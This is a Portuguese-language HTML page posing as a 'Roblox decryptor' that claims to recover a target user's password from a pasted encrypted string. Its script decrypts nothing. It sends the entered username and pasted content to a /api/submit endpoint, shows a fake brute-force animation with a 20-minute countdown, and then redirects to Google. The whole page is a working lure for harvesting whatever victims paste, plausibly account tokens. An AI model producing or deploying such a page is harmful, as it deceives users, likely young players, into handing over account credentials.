<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Descriptografador de Roblox</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Courier New', Courier, monospace;
    }

    body {
      background-color: #0b0e14;
      color: #00ffcc;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }

    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background:
        linear-gradient(rgba(0, 255, 204, 0.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0, 255, 204, 0.03) 1px, transparent 1px);
      background-size: 30px 30px;
      pointer-events: none;
      z-index: 0;
    }

    .container {
      max-width: 800px;
      width: 100%;
      background: rgba(0, 20, 20, 0.85);
      padding: 40px 35px;
      border-radius: 16px;
      border: 1px solid #00ffcc55;
      box-shadow: 0 0 30px rgba(0, 255, 204, 0.2);
      backdrop-filter: blur(4px);
      position: relative;
      z-index: 1;
      transition: all 0.3s;
    }

    h1 {
      font-size: 2.6rem;
      text-align: center;
      color: #00ffcc;
      text-shadow: 0 0 10px #00ffcc88, 0 0 20px #00ffcc44;
      letter-spacing: 2px;
      margin-bottom: 10px;
      word-break: break-word;
    }

    .subtitle {
      text-align: center;
      color: #88ddbb;
      margin-bottom: 30px;
      font-size: 0.95rem;
      opacity: 0.8;
    }

    label {
      display: block;
      margin-top: 20px;
      margin-bottom: 6px;
      color: #aaffdd;
      font-weight: bold;
      letter-spacing: 1px;
    }

    input, textarea {
      width: 100%;
      padding: 12px 16px;
      background: #0f1a1a;
      border: 1px solid #00ffcc66;
      border-radius: 8px;
      color: #ccffee;
      font-size: 1rem;
      transition: 0.3s;
      outline: none;
    }

    input:focus, textarea:focus {
      border-color: #00ffcc;
      box-shadow: 0 0 15px #00ffcc44;
    }

    textarea {
      min-height: 120px;
      resize: vertical;
    }

    .btn {
      display: block;
      width: 100%;
      padding: 14px;
      margin-top: 30px;
      background: linear-gradient(135deg, #00ccaa, #008877);
      border: none;
      border-radius: 8px;
      color: #0b0e14;
      font-size: 1.2rem;
      font-weight: bold;
      letter-spacing: 1px;
      cursor: pointer;
      transition: 0.3s;
      text-transform: uppercase;
    }

    .btn:hover {
      transform: scale(1.02);
      box-shadow: 0 0 25px #00ffcc88;
    }

    .loading-screen {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 400px;
      text-align: center;
    }

    .loading-screen .lock-icon {
      font-size: 4rem;
      margin-bottom: 20px;
      color: #ffcc00;
      text-shadow: 0 0 30px #ffcc00aa;
      animation: pulse 1.5s infinite alternate;
    }

    @keyframes pulse {
      0% { transform: scale(1); opacity: 0.8; }
      100% { transform: scale(1.1); opacity: 1; }
    }

    .glitch-text {
      font-size: 1.5rem;
      font-weight: bold;
      color: #66ffcc;
      letter-spacing: 4px;
      min-height: 3rem;
      margin-bottom: 30px;
      text-shadow: 0 0 10px #66ffcc88;
    }

    .timer {
      font-size: 4rem;
      font-weight: bold;
      color: #ff5555;
      text-shadow: 0 0 20px #ff555588;
      margin: 20px 0;
    }

    .loading-screen p {
      color: #88bbaa;
      font-size: 0.9rem;
      margin-top: 20px;
      opacity: 0.6;
    }

    .hidden {
      display: none !important;
    }
  </style>
</head>
<body>

<div class="container" id="mainContainer">
  <div id="formSection">
    <h1>🔓 Descriptografador de Roblox</h1>
    <p class="subtitle">Insira os dados do alvo e a criptografia para descriptografar a senha</p>

    <label for="username">👤 Nome de usuário (alvo)</label>
    <input type="text" id="username" placeholder="Ex: iLoveRoblox" />

    <label for="content">🔑 Criptografia / Conteúdo</label>
    <textarea id="content" placeholder="Cole a string criptografada aqui..."></textarea>

    <button class="btn" id="decryptBtn">Descriptografar senha</button>
  </div>

  <div id="loadingSection" class="loading-screen hidden">
    <div class="lock-icon">🔐</div>
    <div class="glitch-text" id="glitchText">BRUTE FORCE em andamento...</div>
    <div class="timer" id="timerDisplay">20:00</div>
    <p>⏳ Aguarde... isso pode levar alguns minutos.</p>
  </div>
</div>

<script>
  const formSection = document.getElementById('formSection');
  const loadingSection = document.getElementById('loadingSection');
  const decryptBtn = document.getElementById('decryptBtn');
  const usernameInput = document.getElementById('username');
  const contentInput = document.getElementById('content');
  const timerDisplay = document.getElementById('timerDisplay');
  const glitchText = document.getElementById('glitchText');

  let countdownInterval = null;
  let glitchInterval = null;
  let totalSeconds = 20 * 60;

  function generateGlitch() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*()';
    let result = '';
    const length = 30 + Math.floor(Math.random() * 20);
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  function startGlitch() {
    if (glitchInterval) clearInterval(glitchInterval);
    glitchInterval = setInterval(() => {
      glitchText.textContent = '🔓 ' + generateGlitch();
    }, 80);
  }

  function startCountdown() {
    if (countdownInterval) clearInterval(countdownInterval);

    countdownInterval = setInterval(() => {
      totalSeconds--;

      if (totalSeconds <= 0) {
        clearInterval(countdownInterval);
        clearInterval(glitchInterval);
        window.location.href = 'https://www.google.com';
        return;
      }

      const mins = Math.floor(totalSeconds / 60);
      const secs = totalSeconds % 60;
      timerDisplay.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;

      if (totalSeconds === 83) {
        clearInterval(countdownInterval);
        clearInterval(glitchInterval);
        window.location.href = 'https://www.google.com';
      }
    }, 1000);
  }

  async function handleDecrypt() {
    const username = usernameInput.value.trim();
    const content = contentInput.value.trim();

    if (!username || !content) {
      alert('Por favor, preencha todos os campos.');
      return;
    }

    try {
      const response = await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, content })
      });

      if (!response.ok) throw new Error('Erro ao enviar dados');

      const data = await response.json();
      if (data.success) {
        formSection.classList.add('hidden');
        loadingSection.classList.remove('hidden');
        loadingSection.style.display = 'flex';

        totalSeconds = 20 * 60;
        timerDisplay.textContent = '20:00';

        startGlitch();
        startCountdown();
      } else {
        alert('Erro ao processar. Tente novamente.');
      }
    } catch (error) {
      console.error(error);
      alert('Erro de conexão com o servidor.');
    }
  }

  decryptBtn.addEventListener('click', handleDecrypt);

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && (e.target === usernameInput || e.target === contentInput)) {
      handleDecrypt();
    }
  });
</script>
</body>
</html>
